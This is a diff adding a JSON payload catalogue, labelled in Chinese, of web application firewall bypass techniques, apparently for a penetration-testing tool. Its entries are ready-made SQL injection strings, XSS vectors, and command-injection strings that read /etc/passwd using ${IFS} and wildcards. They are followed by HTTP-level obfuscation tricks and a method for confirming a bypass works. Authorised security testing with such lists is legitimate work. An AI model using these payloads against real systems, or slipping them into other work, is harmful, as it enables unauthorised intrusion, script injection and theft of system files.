@@ -1,0 +1,151 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "WAF 绕过技巧",
+  "categories": ["SQL 注入绕过", "XSS 绕过", "命令注入绕过", "通用混淆", "验证方法"],
+  "items": [
+    {
+      "id": "waf-sqli-comment",
+      "title": "SQL 注释替代空格",
+      "category": "SQL 注入绕过",
+      "code": "1'/**/OR/**/1=1-- ",
+      "desc": "用注释替代空格，绕过对连续空格与关键字的匹配。",
+      "tags": ["waf", "sqli", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 WAF 绕过研究"
+    },
+    {
+      "id": "waf-sqli-case",
+      "title": "SQL 大小写混写",
+      "category": "SQL 注入绕过",
+      "code": "1' uNiOn SeLeCt 1,2,3-- ",
+      "desc": "部分 WAF 规则大小写敏感，混写可绕过。",
+      "tags": ["waf", "sqli", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 WAF 绕过研究"
+    },
+    {
+      "id": "waf-sqli-double-url",
+      "title": "SQL 双重编码",
+      "category": "SQL 注入绕过",
+      "code": "1%2527%2520OR%25201%253D1--%2520",
+      "desc": "目标多次解码时，双重编码可绕过检测。",
+      "tags": ["waf", "sqli", "encoding"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 WAF 绕过研究"
+    },
+    {
+      "id": "waf-sqli-inline",
+      "title": "内联注释版本号",
+      "category": "SQL 注入绕过",
+      "code": "1'/*!50000UNION*//*!50000SELECT*/1,2,3-- ",
+      "desc": "MySQL 内联注释中的内容仍会被执行，可绕过关键字检测。",
+      "tags": ["waf", "sqli", "mysql"],
+      "vars": [],
+      "risk": "attack",
+      "source": "MySQL 官方文档注释语法"
+    },
+    {
+      "id": "waf-xss-svg",
+      "title": "XSS SVG 变体",
+      "category": "XSS 绕过",
+      "code": "<svg/onload=alert(1)>",
+      "desc": "斜杠分隔属性，绕过对空格与 script 标签的匹配。",
+      "tags": ["waf", "xss", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP XSS Filter Evasion"
+    },
+    {
+      "id": "waf-xss-entity",
+      "title": "XSS HTML 实体编码",
+      "category": "XSS 绕过",
+      "code": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+      "desc": "对关键字做实体编码，浏览器解析时仍会还原。",
+      "tags": ["waf", "xss", "encoding"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP XSS Filter Evasion"
+    },
+    {
+      "id": "waf-xss-tab",
+      "title": "XSS 制表符分隔",
+      "category": "XSS 绕过",
+      "code": "<img%09src=x%09onerror=alert(1)>",
+      "desc": "用制表符替代空格，绕过基于空格的规则。",
+      "tags": ["waf", "xss", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP XSS Filter Evasion"
+    },
+    {
+      "id": "waf-cmd-ifs",
+      "title": "命令注入 ${IFS}",
+      "category": "命令注入绕过",
+      "code": ";cat${IFS}/etc/passwd",
+      "desc": "使用 shell 变量替代空格。",
+      "tags": ["waf", "rce", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "waf-cmd-wildcard",
+      "title": "命令注入通配符",
+      "category": "命令注入绕过",
+      "code": ";cat /etc/pass*",
+      "desc": "使用通配符替代完整文件名，绕过路径关键字。",
+      "tags": ["waf", "rce", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "waf-chunked",
+      "title": "分块传输绕过",
+      "category": "通用混淆",
+      "code": "Transfer-Encoding: chunked 分块提交请求体",
+      "desc": "部分 WAF 对分块请求解析不一致，可能绕过检测。",
+      "tags": ["waf", "bypass", "http"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 HTTP 走私与 WAF 绕过研究"
+    },
+    {
+      "id": "waf-content-type",
+      "title": "Content-Type 混淆",
+      "category": "通用混淆",
+      "code": "Content-Type: application/json 与 multipart/form-data 交替尝试",
+      "desc": "不同 Content-Type 走的解析分支不同，规则覆盖可能有差异。",
+      "tags": ["waf", "bypass", "http"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 WAF 绕过研究"
+    },
+    {
+      "id": "waf-unicode",
+      "title": "Unicode 归一化绕过",
+      "category": "通用混淆",
+      "code": "使用全角字符或 Unicode 同形字符替换关键字",
+      "desc": "依赖后端归一化行为，需逐个字符验证，避免破坏语义。",
+      "tags": ["waf", "bypass", "unicode"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 WAF 绕过研究"
+    },
+    {
+      "id": "waf-verify-method",
+      "title": "绕过效果验证方法",
+      "category": "验证方法",
+      "code": "同一 payload 分别直连源站与经 WAF 提交，对比状态码、响应体长度与拦截页面",
+      "desc": "先确认 WAF 存在与拦截规则，再评估绕过是否真实生效，避免误判。",
+      "tags": ["waf", "verify", "method"],
+      "vars": [],
+      "risk": "low",
+      "source": "通用测试方法"
+    }
+  ]
+}
